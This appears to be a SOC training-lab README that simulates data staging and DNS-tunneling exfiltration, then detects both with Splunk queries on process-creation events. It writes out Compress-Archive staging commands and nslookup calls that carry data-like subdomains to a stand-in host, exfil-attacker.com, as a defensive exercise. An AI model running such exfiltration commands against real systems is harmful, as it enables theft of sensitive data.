# 🎯 Scenario 04 — Data Exfiltration Detection

## Scenario Overview

| Field | Details |
|---|---|
| **Scenario Name** | Data Exfiltration |
| **Difficulty** | High |
| **Date** | 19 June 2026 |
| **Analyst** | Jimil Joshi |
| **Tools Used** | Splunk Enterprise, Windows Event Logs |
| **MITRE ATT&CK** | T1560, T1048, T1071.004 |
| **Severity** | 🔴 Critical |

---

## Scenario Story

> An attacker has gathered sensitive files on a compromised machine and attempts to remove them from the network undetected. Instead of a normal file transfer, they compress the data and leak it via DNS queries — a stealthy technique called "DNS tunneling," since DNS traffic is rarely blocked by firewalls. As SOC L1 analyst, detect this exfiltration attempt!

---

## Attack Chain Simulated

```
Step 1 → Sensitive files collected
Step 2 → Files compressed via PowerShell Compress-Archive (staging)
Step 3 → Data exfiltrated via 8 DNS queries to attacker domain (tunneling)
```

---

## Commands Used to Simulate

```cmd
REM Step 1 - Create sensitive test files
mkdir C:\SensitiveData
echo Confidential Customer Data > C:\SensitiveData\customers.txt
echo Confidential Financial Data > C:\SensitiveData\finance.txt

REM Step 2 - Stage/compress data before exfiltration
powershell Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\SensitiveData\stolen_data.zip

REM Step 3 - Simulate DNS tunneling
nslookup customerdata123abc.exfil-attacker.com
nslookup financedata456def.exfil-attacker.com
nslookup secretdata789ghi.exfil-attacker.com
nslookup chunk001.exfil-attacker.com
nslookup chunk002.exfil-attacker.com
nslookup chunk003.exfil-attacker.com
nslookup chunk004.exfil-attacker.com
nslookup chunk005.exfil-attacker.com
```

---

## Detection Queries

### Data Staging Detection
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*powershell*" Process_Command_Line="*Compress-Archive*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line
| sort -_time
```

### DNS Tunneling Detection (Final Working Query)
```spl
index=main sourcetype="WinEventLog:Security" EventCode=4688
| search New_Process_Name="*nslookup*"
| table _time, Account_Name, Process_Command_Line
| sort -_time
```

---

## Results

### Data Staging
| Time | Account | Command |
|---|---|---|
| 14:49:22 | hp | `Compress-Archive -Path C:\SensitiveData\* -DestinationPath C:\SensitiveData\stolen_data.zip` |

### DNS Tunneling — 8 Queries in ~4 Seconds
| Time | Command |
|---|---|
| 14:49:34 | `nslookup chunk005.exfil-attacker.com` |
| 14:49:33 | `nslookup chunk004.exfil-attacker.com` |
| 14:49:33 | `nslookup chunk003.exfil-attacker.com` |
| 14:49:32 | `nslookup chunk002.exfil-attacker.com` |
| 14:49:32 | `nslookup chunk001.exfil-attacker.com` |
| 14:49:31 | `nslookup secretdata789ghi.exfil-attacker.com` |

---

## 🎯 Real SOC Lesson — Multi-Source Detection

The dedicated DNS Client Operational log returned **0 events** for the suspicious domain — a detection gap also seen in the Ransomware scenario. A broader search across all sourcetypes revealed the evidence was instead fully captured by **Event ID 4688 (Process Creation)**, since every `nslookup` command spawns a logged process with the full command line. This demonstrates why SOC analysts must know multiple log sources for the same activity rather than relying on one.

---

## 🎯 DNS Tunneling Pattern

All 8 queries target the same domain (`exfil-attacker.com`) with chunk-style subdomain naming (`chunk001`, `chunk002`...) and data-like labels (`secretdata789ghi`, `customerdata123abc`) — occurring within ~4 seconds, an abnormally high frequency consistent with real-world DNS tunneling tools.

---

## Verdict

**✅ TRUE POSITIVE — Data Exfiltration Confirmed**

---

## Files in This Scenario

| File | Description |
|---|---|
| `README.md` | This file — scenario overview |
| `screenshots/data_exfiltration_staging.png` | Compress-Archive staging detected |
| `screenshots/data_exfiltration_dns_gap.png` | DNS log detection gap (0 events) |
| `screenshots/data_exfiltration_dns_tunneling.png` | DNS tunneling queries detected |

---

## Related Files

| File | Location |
|---|---|
| SPL Query | `SPL-Queries/data_exfiltration_detection.spl` |
| Investigation Report | `Investigation-Reports/data_exfiltration_IR-2026-005.md` |
| Incident Report | `Incident-Reports/IR-2026-005_Data_Exfiltration.docx` |

---

## 📄 Full Investigation Report

📄 [IR-2026-005 — Data Exfiltration Investigation](../../Investigation-Reports/data_exfiltration_IR-2026-005.md)

---

## Screenshot

![DNS Tunneling Detection](screenshots/data_exfiltration_dns_tunneling.png)
